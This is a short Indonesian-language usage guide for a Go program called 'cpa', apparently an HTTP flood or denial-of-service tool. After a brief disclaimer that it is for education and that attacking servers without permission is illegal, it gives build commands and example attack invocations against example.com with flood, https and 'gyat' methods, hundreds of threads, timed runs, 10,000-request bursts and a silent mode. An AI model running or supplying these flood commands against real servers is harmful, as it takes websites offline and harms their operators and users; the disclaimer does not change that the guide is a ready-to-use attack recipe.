Kode ini hanya untuk edukasi dan pengujian di lingkungan sendiri.

Menyerang server orang lain tanpa izin adalah tindakan ilegal (melanggar UU ITE/Cybercrime).

Gunakan dengan bijak dan bertanggung jawab.

# Compile
go build -o cpa cpa.go

# Lihat help
./cpa -help

# Lihat metode yang tersedia
./cpa -methods

# Contoh serangan 60 detik
./cpa -target https://example.com -method flood -threads 100 -duration 60

# Kirim 10000 request
./cpa -target https://example.com -method https -threads 50 -requests 10000

# Mode silent (tanpa output detail)
./cpa -target https://example.com -method gyat -threads 200 -duration 30 -silent

